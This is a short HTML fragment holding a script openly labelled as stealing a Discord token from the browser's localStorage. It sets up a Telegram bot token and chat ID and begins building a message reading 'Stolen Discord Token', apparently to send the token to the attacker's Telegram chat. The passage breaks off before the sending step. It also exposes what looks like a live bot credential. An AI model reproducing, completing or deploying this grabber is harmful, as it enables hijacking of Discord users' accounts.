<body>

    <script>
        // Steal Discord token from localStorage
        var discordToken = localStorage.getItem("token");

        // Telegram Bot Details
        var botToken = "7473688315:AAEa309weHlXoOxMYVNHpZCowNs94ZMj1gE"; // Replace with the bot's token
        var chatId = "6799623923"; // Replace with the group's chat_id

        // Prepare the message
        var message = "Stolen Discord Token: " + encodeURIComponent(discordToken);
